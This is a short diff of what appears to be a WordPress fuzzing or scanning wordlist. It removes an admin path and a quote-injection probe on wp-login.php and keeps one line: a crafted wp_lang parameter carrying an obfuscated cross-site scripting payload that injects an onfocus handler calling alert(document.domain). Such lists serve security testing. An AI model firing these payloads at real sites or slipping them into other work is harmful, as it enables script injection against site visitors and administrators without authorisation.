@@ -1,3 +1,1 @@
-/wp-admin/admin.php
-/wp-login.php?wp_lang=en_US%27
 /wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc<!>usin+alert(`document.domain`)%0c
